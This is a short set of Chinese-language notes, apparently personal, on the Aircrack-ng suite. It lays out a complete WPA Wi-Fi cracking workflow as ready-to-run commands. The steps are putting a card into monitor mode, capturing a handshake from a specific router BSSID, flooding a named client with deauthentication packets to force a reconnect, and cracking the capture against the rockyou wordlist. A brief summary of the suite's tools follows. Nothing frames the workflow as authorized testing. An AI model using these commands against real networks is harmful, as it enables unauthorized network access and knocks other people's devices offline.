#### airmon-ng
[Aircrack-ng套件——無線破解原理及工具詳解](https://www.796t.com/content/1543852627.html)
```
ifconfig   #check wifi interface
sudo -i
airmon-ng start wlan0  //wlan0為前面查到的網絡卡名稱
airodump-ng wlan0mon   # 等待有人登入
# airodump-ng -c <通道> --bssid <路由ID> -w <儲存抓包的目錄名稱> <網絡卡名稱>
airodump-ng -c 3 --bssid D4:EE:07:39:F5:DE -w /root/桌面 wlan0mon
# .洪水攻擊，強制打掉重連
# aireplay-ng -0 0 -a <bssid路由ID> -c <連線wifi的mac IP> <網絡卡名>
aireplay-ng -0 0 -a D4:EE:07:39:F5:DE -c D8:5D:E2:96:AB:EB wlan0mon
#.停止攻擊
#ctrl + c當終端右上方出現：WPA握手：D8：5D：22：96：AB字樣則說明抓包完成，停止攻擊
#抓包完成可關閉監聽模式：root @ kali：〜＃airmon- ng stop wlan0mon（網絡卡名）
airmon-ng stop wlan0mon(網絡卡名)
aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/桌面-1.cap
#// - a2引數：<代表WPA握手包>，可新增至命令執行
#// - w引數：指定字典檔案路徑，rockyou.txt為kali自帶字典，使用前須先解壓：
#root @ kali：〜＃gzip -d /usr/share/wordlists/rockyou.txt.gz
```
```
Aircrack- ng是評估WiFi網路安全性的一整套工具。

- Aircrack-ng無線密碼破解
- Aireplay-ng流量生成和客戶端認證
- Airodump-ng資料包捕獲
- Airbase-ng虛假接入點配置

它側重於無線網路安全的不同領域：

監控：資料包捕獲和資料匯出到文字檔案，以供工具第三方進一步處理
攻擊：通過資料包注入重播攻擊，解除身份驗證，虛假接入點等
測試：檢查無線網路卡和驅動程式功能（捕獲和注入）
破解：WEP和WPA PSK（WPA 1和2）
```
